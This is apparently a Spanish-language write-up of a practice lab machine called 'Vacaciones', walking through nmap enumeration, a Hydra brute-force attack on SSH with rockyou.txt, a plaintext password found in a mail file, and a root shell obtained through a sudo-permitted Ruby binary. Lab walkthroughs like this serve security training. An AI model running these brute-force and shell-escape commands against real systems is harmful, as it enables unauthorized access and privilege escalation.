# Vacaciones

## Descripción

Laboratorio para practicar **fuerza bruta contra SSH** y **escalada de privilegios en Linux**.

---

## Comprobación de conectividad

Primero verificamos que la máquina esté disponible con `ping`.

```bash
ping -c 4 172.17.0.2
```

**Resultado:**

```text
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.103 ms
64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.034 ms
64 bytes from 172.17.0.2: icmp_seq=3 ttl=64 time=0.039 ms
64 bytes from 172.17.0.2: icmp_seq=4 ttl=64 time=0.064 ms

--- 172.17.0.2 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss
```

El **TTL = 64** indica que probablemente se trata de un sistema **Linux**.

---

## Enumeración con Nmap

Realizamos un escaneo para identificar los servicios disponibles.

```bash
nmap -sV 172.17.0.2
```

**Resultado:**

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
```

Se encuentran abiertos los siguientes puertos:

- **22:** SSH
- **80:** HTTP

---

## Enumeración web

Al inspeccionar el código fuente de la página web encontramos el siguiente comentario:

```html
<!-- De : Juan Para: Camilo , te he dejado un correo es importante... -->
```

Este comentario sugiere que **Juan** y **Camilo** podrían ser usuarios válidos del sistema.

---

## Fuerza bruta contra SSH

Se prueba el usuario **camilo** con Hydra utilizando el diccionario `rockyou.txt`.

```bash
hydra -l camilo -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2/ -t 4 -v
```

**Resultado:**

```text
[22][ssh] host: 172.17.0.2
login: camilo
password: password1
```

Credenciales obtenidas:

- **Usuario:** `camilo`
- **Contraseña:** `password1`

---

## Acceso por SSH

Nos conectamos mediante SSH.

```bash
ssh camilo@172.17.0.2
```

---

## Búsqueda de información

El comentario de la página mencionaba un correo, por lo que buscamos archivos relacionados.

```bash
pwd
cd /var/mail
ls -a
cd camilo
ls -a
cat correo.txt
```

Contenido del archivo:

```text
Hola Camilo,

Me voy de vacaciones y no he terminado el trabajo que me dio el jefe.
Por si acaso lo pide, aquí tienes la contraseña: 2k84dicb
```

El correo contiene la contraseña del usuario **juan**.

---

## Cambio de usuario

Utilizamos la contraseña encontrada para cambiar al usuario **juan**.

```bash
su - juan
```

---

## Enumeración de privilegios

Comprobamos qué comandos puede ejecutar Juan con `sudo`.

```bash
sudo -l
```

Resultado:

```text
User juan may run the following commands:

(ALL) NOPASSWD: /usr/bin/ruby
```

Intentar obtener una shell con `sudo -i` no funciona.

```bash
sudo -i
```

Resultado:

```text
Sorry, user juan is not allowed to execute '/bin/bash' as root.
```

---

## Escalada de privilegios

Como **Ruby** puede ejecutarse como **root** sin contraseña, aprovechamos esa configuración para obtener una shell privilegiada.

```bash
sudo /usr/bin/ruby -e 'exec "/bin/sh"'
```

Comprobamos el usuario actual:

```bash
whoami
```

Resultado:

```text
root
```

---

## Resumen

1. Se identificó que la máquina era Linux mediante `ping`.
2. Se enumeraron los servicios con `nmap`.
3. Se encontró un comentario en la página web con posibles usuarios.
4. Se realizó un ataque de fuerza bruta con Hydra al usuario `camilo`.
5. Se obtuvo acceso por SSH.
6. Se encontró un correo con la contraseña del usuario `juan`.
7. Se cambió al usuario `juan`.
8. Se descubrió que `juan` podía ejecutar **Ruby** como root mediante `sudo`.
9. Se utilizó Ruby para obtener una shell como **root**.
